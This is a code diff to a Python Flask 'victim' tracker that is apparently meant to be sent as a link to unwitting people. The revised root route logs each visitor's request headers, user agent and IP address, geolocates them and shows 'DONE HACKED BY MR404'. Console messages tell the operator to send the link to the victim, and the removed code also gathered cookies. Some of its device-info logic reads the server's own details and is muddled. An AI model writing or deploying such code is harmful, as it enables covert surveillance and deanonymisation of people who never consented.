@@ -10,20 +10,16 @@ app = Flask(__name__)
 
 victim_data = []
 
-# Get PORT from environment for Render
 PORT = int(os.environ.get('PORT', 5000))
 
-# Function to get device and location info
 def get_device_info():
     info = {}
     
-    # 1. Get public IP
     try:
         info["public_ip"] = requests.get('https://api.ipify.org', timeout=5).text
     except:
         info["public_ip"] = "Unknown"
     
-    # 2. Get location info from IP
     try:
         ip_info = requests.get(f'http://ip-api.com/json/{info["public_ip"]}', timeout=5).json()
         info["country"] = ip_info.get('country', 'Unknown')
@@ -42,7 +38,6 @@ def get_device_info():
         info["lon"] = "Unknown"
         info["timezone"] = "Unknown"
     
-    # 3. Device info
     try:
         info["local_ip"] = socket.gethostbyname(socket.gethostname())
     except:
@@ -57,22 +52,14 @@ def get_device_info():
 
 @app.route('/')
 def index():
-    return "DONE HACKED BY MR404"
-
-@app.route('/collect', methods=['POST'])
-def collect():
-    data = request.json
+    # Get victim info when they open the link
     device_info = get_device_info()
     
-    if data:
-        device_info["screen"] = data.get("screen", "Unknown")
-        device_info["browser"] = data.get("userAgent", "Unknown")
-        device_info["language"] = data.get("language", "Unknown")
-        device_info["cookies"] = data.get("cookies", "Unknown")
-        device_info["referrer"] = data.get("referrer", "Unknown")
-        device_info["href"] = data.get("href", "Unknown")
-        device_info["headers"] = dict(request.headers)
-        device_info["remote_addr"] = request.remote_addr
+    # Get browser info from headers
+    device_info["user_agent"] = request.headers.get('User-Agent', 'Unknown')
+    device_info["remote_addr"] = request.remote_addr
+    device_info["headers"] = dict(request.headers)
+    device_info["timestamp"] = time.ctime()
     
     victim_data.append(device_info)
     
@@ -88,9 +75,10 @@ def collect():
     print(f"    ISP: {device_info.get('isp', 'Unknown')}")
     print(f"    OS: {device_info.get('os', 'Unknown')}")
     print(f"    Device: {device_info.get('hostname', 'Unknown')}")
+    print(f"    User-Agent: {device_info.get('user_agent', 'Unknown')[:50]}...")
     print("="*50)
     
-    return {"status": "ok"}
+    return "DONE HACKED BY MR404"
 
 @app.route('/data')
 def view_data():
@@ -122,9 +110,10 @@ def main():
     """)
     
     print("\n[+] Server is running on port " + str(PORT))
-    print("[+] Send the link to the victim")
-    print("[+] When victim opens link, they see: DONE HACKED BY MR404")
-    print("[+] Data collected: IP, Country, City, Region, ISP, OS, Device")
+    print("[+] Send this link to the victim")
+    print("[+] When victim opens link, data is collected automatically")
+    print("[+] Victim sees: DONE HACKED BY MR404")
+    print("[+] Data saved in victims_data.json")
     print("[+] Press CTRL+C to stop\n")
     
     app.run(host='0.0.0.0', port=PORT, debug=False)
